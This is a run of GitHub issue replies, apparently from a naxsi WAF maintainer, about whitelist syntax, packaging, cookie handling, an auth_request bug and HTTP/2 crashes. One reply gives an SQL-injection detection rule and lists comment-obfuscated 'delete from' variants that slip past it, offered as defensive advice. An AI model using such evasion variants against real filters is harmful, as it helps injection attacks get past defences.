whitelists you intended to, and adding the negative rule would allow you to \"limit\" the expected content :)\ncheers,\n. Hi,\nUnfortunately, naxsi does not know how to handle utf8 :(\n. Hi !\nFor the initial posters : it is a package related issue.\n@khaefeli : We are internally discussing it, but no definitive plans yet, really depends on the demand we will meet. However, keep in mind dotdeb is extremly reactive for packaging naxsi :)\n. Hi,\nActually the issue is that at some point naxsi had/has a fast release cycle (should happen again soon as I plan to push some new features:p) that packagers can't follow. Plus none of the packagers actually use naxsi themselves in production environment, and I'm not myself part of the debian project :)\nWe are seriously thinking of publishing our own packages and making a public repo, but it will again depend on the users :)\n. Hi,\nClosing the issue as there is not much anything we can do on that :(\n. Hi,\nYes, post_action changed, and needs to be dynamically enabled with \"naxsi_flag_post_action\".\nWe don't use this much (as it might lead to strong performance impact, posting all requests twice), however, you should still be able to use it. In the HTTP headers sent to the /RequestDenied, can you please look for : x-orig-url x-orig-args and x-naxsi-sig ?\nPlease let me know,\n. Hi,\nYes, nx_util is gone.\nYou can find the documentation for nxtool here : https://github.com/nbs-system/naxsi/tree/master/nxapi\n. Hi,\n. Hi,\nNot sure to understand your issue. However, seems naxsi is not in learning mode, so it will stop processing your request as soon as a checkrule provoking a block is triggered.\n. Yep, that's expected, because of your cookies containing characters or things that match naxsi rules.\nYou should either put naxsi in learning mode and/or perform learning on your website.\n. closed by chazz :)\n. Hi, \nPlease see issue 162, we are going to pull @nzin patch.\nClosing this one, please follow up on issue 162.\n. Hi,\nThis seems to be related to @nzin patch for logging.\nWe already faced a previous crash with this patch, we are going to pull it before next release.\nWe are going to reverse on master and ping you back then.\n. Hi,\nPatch reverted, works \"as expected\".\n@nzin's patch might be merged later once fixed etc.\nClosing the issue, don't hesitate to re-open if you find anything weird :)\nAnd thanks !\n. Hi,\nI can't reproduce the issue, with or without '=' between --filter and actual fiter seems to work.\n. Hi,\nThe first rule should be enough to cover the exception :\nBasicRule wl:1310,1311 \"mz:$URL:/wp-admin/post.php|BODY|NAME\";\nCan you conform this is not a human mistake ? I fail to reproduce your bug.\n. Hi,\n1\u00b0) Regarding regexes with several matching groups  : BasicRule wl:0 \"mz:$URL_X:^(.)/admin/(.)|BODY\";\nWe actually identified a bug a few weeks ago that is related to PCRE output vectors (which impact the number of matching groups you can use). We faced the same issue here, and on master/ the output vector size has been increased, to allow up to ~10 matching vs ~2 now.\n2\u00b0) Regarding the whitelist that do not seem to work : BasicRule wl:0 \"mz:$URL_X:^/admin/|URL\";\nThis is really weird, as it should work (pretty sure it does :p). However - we do host a lot of magento as well - and we tend to create another location for /admin and filter it by ip, and deactivate naxsi on it. Please note that wl:0 does not disable internal rules !\nBasicRule wl:0 \"mz:$URL_X:admin\"; #this whitelist is not valid, as you do not specify match zone ($URL..:/x is not a match zone)\nLet me know :)\n. Hi,\nI think there is a slight mistake here :\n- |BODY and |BODY|NAME are not the same. If you want to whitelist something in the variable 'name' instead of its 'content', you should use BasicRule wl:1310,1311 \"mz:$URL:/admin|BODY|NAME\";\nPlease don't hesitate to reopen if you still face issues\n. Hey,\nWe are going to do the merge tomorrow (or hope to), and release an RC by the week-end.\nAs soon as the RC is ready, you can give it a try :)\nThanks for your interest !\n. Hello dear friend from the mystical windows realm :)\nCan you provide a bit more details on the errors ?\nSeem it didn't like our declarations in the style \"naxsi_skeleton.c:  ngx_http_special_score_t *libjct_xss = ngx_array_push(nx_int__libinject_xss->sscores);\"\n. Hello Alice,\nmmh either I missed something, or you forgot some data in your paste ?\nI still don't get the error :p\n. Hi,\nThis has been an internal topic of discussion.\nDouble decoding everything might be an option, but I'm afraid it's only the begining of the slidding slope of \"let's decode everything\"... So far, we didn't notice real cases of legitimate double encoding usage, so I'm not yet convinced.\nIf you have some points in the favor of double-decoding everything, I'm open ;)\n. Please re-open if you have suggestions :)\n. Hi,\nNo, you didn't misunderstood, naxsi doesn't parse/decompose cookies yet :)\nMight arrive in a future version !\n. yep, I agree with myself, feature postponed :)\n. what about : https://twitter.com/UdellGames/status/788690145822306304/photo/1\n@jvoisin \n. oh nice finding, seems to be a null pointer deref that was not spotted before :)\nI'm going to look at that tonight and come back to you asap.\nthanks for the fuzzing\n. yep, induced by the change of the logging that splits the line in fragments.\nI'll wait to do my push to close the issue :)\n. fixed, thanks for the report, RC2 incoming soon :)\n. would be cool to merge it into nxtool, as it already knows how to read logs, wouldn't it ??\n. Hi,\nYes, naxsi does not know how to properly parse cookies.\nBut the encoding rule might match anywhere, not only on cookies, it's meant to detect chained encoding that naxsi won't know how to handle.\n. Hi,\nI don't remember if the cookie is decoded by naxsi :p\nBut admitting it behaves as you suggest, then yes, rule 1315 will trigger over url-encoded stuff in cookies. Proper parsing of cookies would be cool indeed ;)\n. Hi,\nsorry for delay, not much time to work on the project lately :)\nAfter checking, cookies are not decoded, so 1315 will trigger on cookies, even if not double encoded (but at least simple encoded). However, after thinking about this, I believe it's not a serious issue, as most of the time, only ; and = are url-encoded.\nIf you feel this is still an issue, I'm open to discussion :)\n. hello @lizter\nIn your case, I guess it is not big deal to white-list double encoding in cookies as it seems to be already present. This case is more here to back the eventuality of weird applications :)\n. please see wiki, esp https://github.com/nbs-system/naxsi/wiki/whitelists\nOn Tue, May 24, 2016 at 10:50 AM, Christian Strand Young \nnotifications@github.com wrote:\n\nThank you for the reply. Do you have any tips on how I can do this? I\ntried to add BasicRule wl:1315 \"mz:HEADERS:cookie\";, but that gave me nginx:\n[emerg] Naxsi-Config : Incorrect line BasicRule wl:1315\n(../naxsi-0.54/naxsi_src//naxsi_skeleton.c/477)... in\n/etc/nginx/naxsi.rules:13\n\u2014\nYou are receiving this because you modified the open/close state.\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/181#issuecomment-221205846\n. Hi,\n\nYes : if the request's size exceed \"client_body_buffer_size\", it will be buffered to disk, and naxsi won't parse it (he doesn't know how to do it, and it might have a huge performance impact).\nSo, either you disable rule 2 for that specific URL (but naxsi won't see anything in BODY vars for that URL), or you increase the client_body_buffer_size to avoid that :)\nSee as well : https://github.com/nbs-system/naxsi/wiki/naxsilogs\n. Hi,\nThanks for the feedback :)\nThe internal rule itself is not a feedback, however - as you say - it might happen in a legit way, I will look at a way to fix this, so that it can be disabled for legitimate purposes, but still match if no whitelists were applied !\n. I guess we should simply remove the dummy_error_fatal() call, it will allow to whitelist this.\n. Hi,\nIt should be fixed with last commit.\nCan you test on master branch, and re-open if it doesn't fit your needs ?\nYou should now be able to Whitelist the specific internal ID.\n. Yes, you are right, naxsi does not check the content of uploaded files, he's way too dumb for this, most he can do is check filename :)\n. @khaefeli : I don't think this is related, yours was the fact that the body is too big and got buffered on FS by nginx, which naxsi won't parse :)\n. Hi,\nI never encountered specific errors with IE11 + naxsi, but I'm not a windows user, so I can't really try :(\nid:13 is an internal rule for \"uncommon post format\", which is a bit vague, so possible cases are :\n- bad content disposition\n- missing boundary line\n- impossible to parse content-disposition field\n- lack of var_name in the post\nHowever, naxsi should log something when this happens (as long as you setup the log to debug in nginx) saying a bit more about this. Can you post those logs ?\ncheers,\n. Hi,\nSorry for the delay in my answer, picking back on issues !\nSo regarding your issue, I guess it's a browser problem, as you mentioned it does not happen with other browsers. When naxsi is not blocking the request, does the application behave as expected ? Because either naxsi miserably fails at parsing your request, or the browser is doing wrong (in the latest case, I don't know how application would behave without a name in the POST variable, but my guess is \"not\").\nYou should be able to whitelist ID:11 to fix the issue, but it might (will probably) create a partial bypass in the WAF.\nIf you are able to transmit me a full body (including \\r\\n) it will allow me to get a better understand, and know if we will just blame IE11 for being a crappy browser, or actually sort some real issue in naxsi :)\nCheers,\n. cool,\ncheers,\n. Hi,\nSo far, you can only check file extensions / file names of uploaded files.\nWe did not plan to integrate file content parsing, as it is a huge field, and we feel like it's more of an AV job, plus obfuscation might make it too easy to bypass :(\n. Hi,\nI pushed a fix upstream for this.\nNow most of the calls to the \"killer macro\" (dummy_error_fatal) are in if(ngx_http_apply_rulematch_v_n()) { } blocks.\nThis should allow you to effectively whitelist those internal rules.\n. Just re-open if the fix didn't work :)\n. Hi,\nYes, nxtool requires ES.\nIt might sound annoying, but sqlite/mysql DB backend was too troublesome\nfor us to be able to procude decent learning.\nWe do not have plans for other DBs back-ends so far.\nOn Thu, Jun 11, 2015 at 12:11 PM, m0l1n notifications@github.com wrote:\n\nYou really have to install an ES cluster just to use the nxtool.py ?\nCan't we just use the tool on the naxsi log the way nx_util did it ?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111076640.\n. \"Cluster\" is a big word for a software you can launch standalone !\nBut yeah, I do understand the strugle, however - it takes what it takes :)\n\nNoted for the ElasticSearch suggestion in the documentation.\nIf you already have feedback or suggestions, they are welcome\nps: the wiki is open for editing by anyone !\nOn Thu, Jun 11, 2015 at 2:36 PM, m0l1n notifications@github.com wrote:\n\nYes, it just sound quite heavy to me :\n-\"Hey can I whitelist with naxsi?\"\n-\"Yeah you just need an ES cluster\"\nBut well it's a solution, but in that mind it would be great if you could\nmake some documentation about it, or at least a redirecting link to\nElasticSearch page ;)\nI mean whitelist is what make naxsi nice to use !\n2015-06-11 14:32 GMT+02:00 buixor notifications@github.com:\n\nHi,\nYes, nxtool requires ES.\nIt might sound annoying, but sqlite/mysql DB backend was too troublesome\nfor us to be able to procude decent learning.\nWe do not have plans for other DBs back-ends so far.\nOn Thu, Jun 11, 2015 at 12:11 PM, m0l1n notifications@github.com\nwrote:\n\nYou really have to install an ES cluster just to use the nxtool.py ?\nCan't we just use the tool on the naxsi log the way nx_util did it ?\n\u2014\nReply to this email directly or view it on GitHub\n<https://github.com/nbs-system/naxsi/issues/191#issuecomment-111076640\n.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111116362.\n\n\nCordialement,\nMOLLARD Quentin,\nEtudiant en Master Informatique,\n\u00e0 l'IM2AG , Universit\u00e9 Joseph Fourier .\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111117409.\n. Awesome, thank you :)\nDon't hesitate to drop by on irc if you need any help!\n. You're welcome.\nDon't use nx_util, it's evil and will do bad things to you :)\n\nOn Tue, Jul 7, 2015 at 2:32 PM, Cartogenic notifications@github.com wrote:\n\nThank you for all your help =)\nSorry for the very late response, I rarely check my mail, and got around\nthe problem using the old white list tool.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-119190417.\n. Hi,\n\nunfortunately, it seems debian developpers didn't chose to continue to package naxsi in jessie ...\nsome people in the community are thinking about building and publishing packages, so stay tuned :)\n. Hi,\nAre you sure it is related to naxsi ?\nIf so, can you provide me a way to reproduce the bug ?\n. Thanks for the report, we are going to fix that and ping you :)\n. Hi antonin,\nthis should be fixed now : https://github.com/nbs-system/naxsi/commit/2ba5f82ad470fb2ca0ddb09b4b06668ed8ed9fe5\n. Hi,\nSorry for delay, was quite busy :)\nCan you please rephrase your question, I'm not sure to understand ? :)\n. Did you add the ; at the end of the line ?\n. Hi,\nIf you want to integrate support for mongodb in nxtool, you are welcome :)\nBut we are not going to do it on our own !\n. Hi,\nThat's actually a very good point, and there is no reason not to do so :)\nIn the past, most people tend to use packages from official repositories, but it seems a good thing to do.\nThanks for the suggestion,\n. It's easy, I sign my code with \"signed by bui\" so that people know it's me :)\nMore seriously, I'm going to try give it a try today, so stay tuned !\n. https://github.com/nbs-system/naxsi/releases/tag/0.54rc3\nDoes it looks good ? :)\n. Hi,\nSorry for delay, missed this one :)\nI'm going to update the current release for consistent filename, and I'll\nchange digest in close future :)\nOn Thu, Oct 15, 2015 at 7:13 PM, Nick B. notifications@github.com wrote:\n\n@buixor https://github.com/buixor It's been a week was wondering if\nanybody had the chance to verify the signature mismatch. If this requires a\nnew issue to be opened let me know. I figured it best fit in this already\non-topic one. Thanks.\nSomething like this should be addressed as soon as possible as it could\nindicate either a tampered with source archive, or a corrupted one. Neither\nof which should be available for people to download and use.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/201#issuecomment-148461931.\n. Ah, I didn't see that signature was bad!\n\nGoing to (try to) fix it today :)\n. Hello !\nThis is indeed a mistake, a \"someone\" from the community was supposed to make this page from the wiki, but it didn't happen :(\n(Hope you see the effort on the wiki still)\nI'm going to do it as soon as I have some time, this was unintentional !\n. meh actually not going to GPL3. After discussion with people, it might be an issue, especially with IoT\n. Hi,\nSeems you step a foot in the fantastic word of encoding handling and python.\nIt is probably because you have some weird stuff in either the content of the whitelist, it might be the content itself (displayed if you have extensive_log). If you can transmit me a sample, I can fix the encoding issue :) If you don't want to post it on the bugtracker, mail it to me : bui@memze.ro\ncheers,\n. ty chazz :)\n. Hi,\nSorry to say so, but there is a bug, which disallows you to use | in regular expressions, as it's used as a separator between elements of the matchzone.\nWe don't know how to fix it yet without doing terrible things that will give us nightmares :(\n. Unfortunately, I don't think it is possible, one of the reasons being that regex allow you to escape |, so you would end up in an endless escaping sequence (is it a real pipe, an escaped one, or is it an escaped pipe prefixed by escaped backslash ? etc.)\nIf someone has an idea, I'm open, but so far I don't see any viable one :)\n. yes it is, because [ is not used by naxsi itself as a special character. Don't misunderstand me, it's not nginx's nor pcre's fault, but really a poor design decision on my side :) (at a time where I didn't even plan to support regex in match zones).\n. Hi,\n\nCan we not use a comma as the matchzone separator instead of a pipe?\nSorry but no :D for the sake of backward comptability (can you see\nforthcoming drama, breaking all ever written whitelists or signatures ?),\nand not replacing an unsolvable problem by an equally unsolvable problem, I\nmust refute this idea with vigor :)\ncomma being much less likely as it has no special meaning in PCRE,\nActually, it's used for repetitions etc. so it will create other problems,\nie. a{3,}\n\nSorry, but for now seems we'll have to live with this !\nOn Tue, Jun 30, 2015 at 4:07 PM, Orion notifications@github.com wrote:\n\nOne last suggestion, I'm probably wrong anyways.\nCan we not use a comma as the matchzone separator instead of a pipe? The\nscore section already uses commas as its separator. I see a conflict with a\ncomma being much less likely as it has no special meaning in PCRE, and it's\nnot going to be as useful as allowing the use of a pipe in a regex.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/208#issuecomment-117199489.\n. thanks :)\nDid you try it btw ?I can't right now :p\n. Hi,\n\nnaxsi does not support creating rules on the request method so far, sorry.\n. more info ?\n. Hi, seems that there is a confusion on nginx's site, as the key available at http://nginx.org/keys/nginx_signing.key is still 7BD9BF62. I'm going to add both !\n. Hi,\nIt means that none of the events stored into the ES database have been tagged yet.\ntagging is manually performed with nxtool, when you use the --tag options and provide whitelists.\nSee: \nhttps://github.com/nbs-system/naxsi/tree/master/nxapi#3-tagging-events\n. I'm attempting to summon @guiguiabloc for intel here :)\n. Hi @Keithsc,\nis @guiguiabloc explenation fine for you ?\nif it's not a bug, please close issue :)\n. https://github.com/nbs-system/naxsi/commit/f406d7f5cc7531383b00490c6219d9e7f74eed16\nshould be fixed. naxsi will scream if it sees some inconsistent WL.\n. Hi !\nI tried like this :\n MainRule \"rx:delete([\\s]+)from\"  \"msg:text RX\" \"mz:ARGS|URL|BODY|$HEADERS_VAR:Cookie\" \"s:DROP\" id:1319;\nand it works for me, I think you forgot to quote or something.\nOn a side note, if this is to detect SQLi, that's a bad idea, because :\ndel/**/ete from\ndelete/**/     from\ndelete/**/ /**/fr/**/om\nare valid forms as well, and there are many other possible variations.\n. Hi,\nCan you show the stats you have with \"-x\" option ?\nAs well, you should add \"-s fqdn.com\" to generate the rules.\n. mh, that is quite weird :)\nIt seems that nxtool does not see / find your templates.\nCan you please check that the path pointed by nxapi.json (installed by default in /usr/local/etc/) contains actual templates ?\n\"naxsi\" : {\n \"rules_path\" : \"/etc/nginx/naxsi_core.rules\",\n \"template_path\" : [ \"tpl/\"], \n \"geoipdb_path\" : \"nx_datas/country2coords.txt\"\n},\n. yes, definitely looks like me :p\n. Hey Craig,\nCan you give a try to this branch : \nhttps://github.com/nbs-system/naxsi/tree/mixed_matchzone_detection\nI added some code to detect matchzones mixing the regex and static string matches.\ncheers,\n. Closing, @craiglawson will open if issue is spotted\n. Hi,\nNaxsi's code is in GPL.\nThe BSD license you are refering to must be from libinjection :)\n. Closing, feel free to re-open if unclear\n. Hi,\ncompatibility is specfied in the help page.\nbut your WL is not accepted because it's not correct.\n$URL[_X] alone can't specifiy where an event is hapenning, it can simply be used to \"restrict\" the whitelist scope.\nie. \"mz:$URL_X:^/foo$|ARGS\" is correct, \"mz:$URL_X:^/foo$\" means nothing to naxsi, he doesn't know in which \"zone\" you want to whitelist id. If you want to whitelist it in URI, it is : \"mz:$URL_X:^/foo$|URL\".\n. Hi,\nBoth the patterns and the match zones arguments (here, /Test) must be lowercase, naxsi being case insensitive.\nI edited the wiki to make it clearer,\nthanks\n. thanks !\n. Hi,\nThanks for the bug-report.\nIn the configuration you pasted in your nginx ticket, I do not see any naxsi configuration, did you strip it on purpose, or does it means that it happens even if naxsi's code is not explicitly enabled ?\nregards,\n. Can you please provide a full non strippped config so I can reproduce it ?\n. thanks for the details, I will look into it\n. Hello,\nSorry, but I did not manage to reproduce the issue, can you give me a hand ?\n(I use naxsi dev's env, so we have something reproducible)\ncp -R .../nginx/nginx-1.9.1 /tmp/\ncd naxsi_src\nmake re deploy\n(note: this deploys a dummy nginx in /tmp/naxsi_ut)\nThen I edit nginx.conf to make it look like yours (/tmp/naxsi_ut/nginx.conf)\n``` nginx\nserver {\n  listen 4242;\n  server_name  localhost;\nlocation /myapp {\n  # Naxsi config\n  LearningMode;\n  SecRulesEnabled;\nDeniedUrl \"/RequestDenied\";\nCheckRule \"$SQL >= 8\" BLOCK;\n  CheckRule \"$RFI >= 8\" BLOCK;\n  CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n  CheckRule \"$EVADE >= 4\" BLOCK;\n  CheckRule \"$XSS >= 8\" BLOCK;\nauth_request /auth;\n  proxy_pass http://77.153.128.117/;\n  proxy_set_header Host www.google.fr;\nroot html;\n}\nlocation = /auth {\n  proxy_method GET;\n  proxy_pass_request_body off;\n  proxy_pass_request_headers off;\n  if ($cookie_auth) {\n    set $app_auth \"Token $cookie_auth\";\n  }\n  if ($http_authorize) {\n    set $app_auth $http_authorize;\n  }\n  proxy_set_header Authorize $app_auth;\n  proxy_set_header Host $host;\n  proxy_set_header Content-Length \"\";\n  proxy_pass http://localhost:4241/random/url;\n} \n```\n(localhost:4241 is just a netcat so I can answer 200 OK by hand)\nGET request : I get the answer without problem, as you described.\nPOST request :\n$ curl -d \"test\" http://127.0.0.1:4242/myapp\n<!DOCTYPE html>\n<html lang=en>\n  <meta charset=utf-8>\n  <meta name=viewport content=\"initial-scale=1, minimum-scale=1, width=device-width\">\n  <title>Error 405 (Method Not Allowed)!!1</title>\n  <style>\n    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}ht\n....\n(the scrapped HTML is google's answer)\nin the meanwhile in the netcat :\n```\n$ nc  -vlp 4241\nlistening on [any] 4241 ...\nconnect to [127.0.0.1] from localhost [127.0.0.1] 60381\nGET /random/url HTTP/1.0\nHost: localhost\nConnection: close\nHTTP/1.1 200 OK\n```\nAnd I get the answer here.\nPlease let me know what I missed to reproduce your issue !\nRegards,\n. thank you, I'm trying to give it a look soon :)\n. Sadly, I'm fraid the latest won't fix the issue, none of the mechanics\nwhere changed :/\nOn Fri, Oct 23, 2015 at 10:07 AM, Andrei S. notifications@github.com\nwrote:\n\nJust noticed, we're using naxsi-0.54rc3. Will test the latest release soon\nand confirm if we see the same problem there.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/226#issuecomment-150502675.\n. Not yet, but you seem to have provided some quite precise things for me to\ndo so.\nI'll try not to be too lazy this week-end and give it a more serious look ;)\n\nOn Fri, Oct 23, 2015 at 10:28 AM, Andrei S. notifications@github.com\nwrote:\n\nSo we can take this as a confirmation that you were able to reproduce the\nissue ? :)\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/226#issuecomment-150511075.\n. Sorry, I failed you and had a lazy week-end :p\nBut I'll check it asap, just that it might requires some serious dive-in :)\n. Hi,\n\nOk, just tested it :)\nAt least (good for you, bad for me), I can confirm the bug exists.\n. Hello,\nI didn't gave up, but I still didn't understand what is happening, as it's something I never see.\nI guess I will have to turn myself to the developper's ML for help :)\n. Hi,\nI worked a bit on it this week-end and I'm getting closer to it I guess, but I don't have yet a fix to submit, I still need to play around a bit !\nI didn't give up and I'll keep you posted as soon as I have something that seems plausible :)\n. Hi & happy new year !\nSome further testing have provided some interesting things (no, i didn't solve the issue yet):\n- form-input-nginx-module (by agentzh) is often cited as a reference (on nginx-dev ML) for modules reading the request body in the REWRITE phase.\n- if I produce a setup combining form-input-nginx-module + mod_auth without naxsi, I still get the bug (based on the provided test-case)\nSo far, I think that either nginx changed something in the internals (since nginx 1.7.4), or I've been wrong the whole time, or mod_auth as an issue. Just to be sure I'm not brain-fried, can you confirm that the following setup still gives you the same issue\ncd .../naxsi_src/\ngit clone http://github.com/simpl/ngx_devel_kit.git\ngit clone http://github.com/calio/form-input-nginx-module.git\nRemove naxsi from ./configure, add form-input :\n--add-module=$(MOD_PATH)/ngx_devel_kit \\\n --add-module=$(MOD_PATH)/form-input-nginx-module \\\n --with-http_auth_request_module \\\n --with-debug\nI used the following configuration :\n```\nlocation /myapp {\nensure client_max_body_size == client_body_buffer_size\nclient_max_body_size 100k;\nclient_body_buffer_size 100k;\nset_form_input $data;    # read \"data\" field into $data\nset_form_input $foo foo; # read \"foo\" field into $foo\nauth_request /auth;\nproxy_pass http://77.153.128.117/;\nproxy_set_header Host www.google.fr;\n}\n```\nCheers, and thanks for your patience !\nps: that's a really sneaky tricky *** bug :)\n. Hi !\nI didn't mean that mod_auth is wrong, I definitely trust maxim on this kind of topic ^^\nIf you confirm the issue, I'm going to turn to nginx-dev's ml.\nUsing form-input-nginx-module as a use case is definitely easier than naxsi, as the code is way shorter and cleaner !\ncheers,\n. I'm going to shoot an email to nginx-dev's ML to check. I'll mostly ask if form-input-nginx-module is doing things correctly :)\nKeep me posted as well,\ncheers !\n. Hi,\nI posted on nginx-dev ML : http://mailman.nginx.org/pipermail/nginx-devel/2016-January/007762.html\nSo far, I didn't get the perfect answer but some good clues. Maxim suggested something I will need to try (first attempt failed), while agentzh tends to point at auth module ;)\nI didn't give up ;)\n. Hello,\nSorry for delay :)\nI tried Maxim suggestion, but without success. Tbh I think agentzh might be right, as I didn't manage to reproduce the bug with any other module except this one. I will try to get back on it after we release 0.55, I didn't had much chance to work on this issue :(\n. @FlorinAsavoaie Can you please notify us if you encounter the same issue with mod_sec and auth_request ? If it's the case, I should document the known incompatibility between those two modules.\n. @dani This is what (I think but ofc I didn't keep proper track of it) I tried after maxim's suggestion when I posted, but it's worth giving a try again :)\n. @dani in our case, the changes should be made in ngx_http_dummy_access_handler of naxsi_skeleton.c around this part.\nUnfortunately, it seems I didn't keep track of my previous attempts (no commit), so I guess I'll have to first spend some time to do the restoration of event_handlers in a branch for you to properly test :/\n. Hi @rfnx :)\nWe didn't start working on the http2 compat.\nI hope we will find some time in Jan to work on it, but it is not going to come that soon. http/2 brings a lot of new things that will definitely have serious impacts :)\n. Hi,\nSorry for delay :)\nYes, we are going to add a warning at least. Sorry, I didn't really have time to look at the subject in depth, I just already know it's going to be tricky as http/2 seems to have a lot of tricky things (from the RFC) that might have security implication.\nI'll keep you posted ;)\n. Hi,\nDon't worry, you request is totally legit.\nNo news yet, except I started looking at it (no code written yet), I will try to squeeze some time to work on it, but it's definitely in my plans :)\n. Hello,\nThis is indeed something we need to work on, but as you might understand, we'd better not take the topic lightly. I plan to work on it as soon as we are done with release 0.55 (we have a few open bugs to close first), but tbh we didn't start working on http2 yet.\nIt will come, I know some of you would have hoped sooner, please a bit more patience.\nI will come back to you as soon as we have something testable ;)\n. Hi,\njust started to do some basic tests with http2, and it seems to be working so far.\nIf any of you can possibly submit a test that triggers any bug, please do so !\n. @Promaethius : yes exactly, that's why I'm begging for some test cases.\n@AnoopAlias : thanks, my initial tests seem to pass as well\n. @selivan : any chance you have more indications on what caused the crash ?\n. Thanks :)\nAny chance you could provide a dump of the http request?\nOn 29 Apr 2016 22:53, \"rfnx\" notifications@github.com wrote:\n\n@buixor https://github.com/buixor Hello, thanks again for your work. I\ntried again and I still have a crash with naxsi. This is very easy to\nreproduce : for me, it happens everytime I click the \"connection\" button on\nmy wordpress site, to go to the admin connection page (default to\n/wp-admin).\nConfiguration :\n- nginx version : 1.10.0;\n- naxsi version : 0.55rc1;\n- http/2 enabled;\n- Linux kernel with grsecurity.\nMy system log after the crash :\nkernel: grsec: From 127.0.0.6: Segmentation fault occurred at 0000000000ad37e4 in /usr/bin/nginx[nginx:11381] uid/euid:33/33 gid/egid:33/33, parent /usr/bin/nginx[nginx:11379] uid/euid:0/0 gid/egid:0/0\nkernel: grsec: From 127.0.0.6: bruteforce prevention initiated for the next 30 minutes or until service restarted, stalling each fork 30 seconds.  Please investigate the crash report for /usr/bin/nginx[nginx:11381] uid/euid:33/33 gid/egid:33/33, parent /usr/bin/nginx[nginx:11379] uid/euid:0/0 gid/egid:0/0\nsystemd-coredump[11419]: Process 11381 (nginx) of user 33 dumped core.\n```\n                                                    Stack trace of thread 11381:\n                                                    #0  0x00000000004c5964 nx_find_wl_in_hash (nginx)\n                                                    #1  0x00000000004c5e85 ngx_http_dummy_is_rule_whitelisted_n (nginx)\n                                                    #2  0x00000000004c7599 ngx_http_apply_rulematch_v_n (nginx)\n                                                    #3  0x00000000004c7ee2 ngx_http_basestr_ruleset_n (nginx)\n                                                    #4  0x00000000004c82c5 ngx_http_dummy_headers_parse (nginx)\n                                                    #5  0x00000000004c9980 ngx_http_dummy_data_parse (nginx)\n                                                    #6  0x00000000004cbc9e n/a (nginx)\n                                                    #7  0x00000000004563fc ngx_http_core_rewrite_phase (nginx)\n                                                    #8  0x0000000000451895 ngx_http_core_run_phases (nginx)\n                                                    #9  0x000000000045c973 ngx_http_process_request (nginx)\n                                                    #10 0x00000000004890a6 n/a (nginx)\n                                                    #11 0x0000000000489d76 n/a (nginx)\n                                                    #12 0x0000000000489fbe n/a (nginx)\n                                                    #13 0x0000000000488855 n/a (nginx)\n                                                    #14 0x000000000043e750 ngx_event_process_posted (nginx)\n                                                    #15 0x0000000000444921 n/a (nginx)\n                                                    #16 0x0000000000443350 ngx_spawn_process (nginx)\n                                                    #17 0x0000000000444c84 n/a (nginx)\n                                                    #18 0x00000000004455a4 ngx_master_process_cycle (nginx)\n                                                    #19 0x0000000000421838 main (nginx)\n                                                    #20 0x0000031d74329710 __libc_start_main (libc.so.6)\n                                                    #21 0x0000000000421d09 _start (nginx)\n                                                Stack trace of thread 11392:\n                                                #0  0x0000031d761333e8 pthread_cond_timedwait@@GLIBC_2.3.2 (libpthread.so.0)\n                                                #1  0x00000000006f3095 n/a (nginx)\n                                                #2  0x00000000006efb3a n/a (nginx)\n                                                #3  0x000000000050b86e n/a (nginx)\n                                                #4  0x00000000006f4588 n/a (nginx)\n                                                #5  0x0000031d7612d424 start_thread (libpthread.so.0)\n                                                #6  0x0000031d743f0cbd __clone (libc.so.6)\n\n```\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/227#issuecomment-215878934\n. @rfnx : yes if you can! it seems to be where the trouble happens :)\n. Yep, really looking forward as well.\n\nHowever, even admitting I find & fix the mentioned issue, you should all take it with caution (and like no guarantees) until we performed serious testing and declaring it \"free of super obvious potential bypasses because http/2 is very tricky\"\n:)\n. Hello,\nthanks @rfnx !\nFrom a first hand look, seems that the headers are now stored (already lower cased) in r/o memory zone, thus the segfault when naxsi tried to lower-case it.\nI will start patching the http2 branch, however please don't consider it production ready ;p\n. I'm not closing this one to track progress on http2 support\n. so far seems good, but I didn't have the time to properly fuzz http2 and naxsi, so it's even more \"at your own risk\" than before :D\n. @AnoopAlias : should be branch http2, I didn't merge in master yet :)\nIt will come in 0.56 I guess !\n. Hello,\nFor people playing around http2 / naxsi, have a look at : #294\n. #294 should be fixed now, waiting for feedbacks before closing the issue :)\n. Hello @marcelomd ,\nI didn't manage to reproduce the bug.\nCan you confirm you can reproduce like this ? (from naxsi_src directory)\nmake clean all && /tmp/nginx/objs/nginx && curl -k 'https://127.0.0.1:4242/' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36' --compressed -vso/dev/null -H \"cookie: __atuvc=1%7C27%2C0%7C28%2C0%7C29%2C\"\nThanks :)\n. ah properly I am the one dumb, my curl was properly not up to date etc.\nI will do some more testing and come back to you soon :)\n. Hello everybody,\nCan you please collect coredumps for me of those segfaults ?\nDon't expect any update on this next week, I will be chilling in the sun :/\nHowever I plan to have some time on this when I come back.\nIn the meanwhile, people can use @marcelomd MR #309 with branch http2 that should address the issue.\nCheers,\n. Hello,\nAny crash after applying #309 patch ?\nIf the solution seems ok, I'll look at how to do it without memory copy.\ncheers :)\n. Hello !\nIt seems \"stable\", and it will get merged for next release.\nWe do need to do some extra testing tho, to ensure that http2 doesn't open any potential partial/complete bypasses (which I didn't extensively test)\nIf anyone is up for help & feedback, please ping me :). @viktor-zhuromskyy : hello, can you provide more info on that crash ? :). Hello,\n@danlsgiga / @Louvremaster : did this happen with the http2 branch ?\nThanks !\nps: sorry for delay, I was kinda busy, http2 branch is going for merge in next major. That is bad news :( I'm going to look at it when I come back from hollidays, end of April. Eh I guess I should really merge this one into http2 branch, @marcelomd : no update to do on this one ?. merged into http2, which itself should make 